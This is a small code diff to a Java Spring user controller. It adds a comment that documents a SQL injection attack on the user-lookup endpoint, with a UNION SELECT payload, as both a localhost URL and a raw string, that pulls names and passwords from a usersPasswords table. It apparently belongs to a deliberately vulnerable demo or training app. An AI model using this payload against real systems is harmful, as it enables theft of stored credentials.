@@ -20,7 +20,14 @@ public class UserController {
     @Autowired
     private UsersService usersService;
 
-
+    /*
+     * Attack vector - enumerating data
+     * SQLi UNION
+     * http://localhost:8084/api/user/1'%20UNION%20SELECT%20id,%20name,%20password,%20password,%20id%20FROM%20usersPasswords%20LIMIT%202,1--'
+     *
+     * attack string
+     * ' UNION SELECT id, name, password, password, id FROM usersPasswords LIMIT 1,1--'
+     * */
     @ResponseBody
     @RequestMapping(value="/{id}", method=RequestMethod.GET)
     public UserAccount findUser(@PathVariable("id") String id){
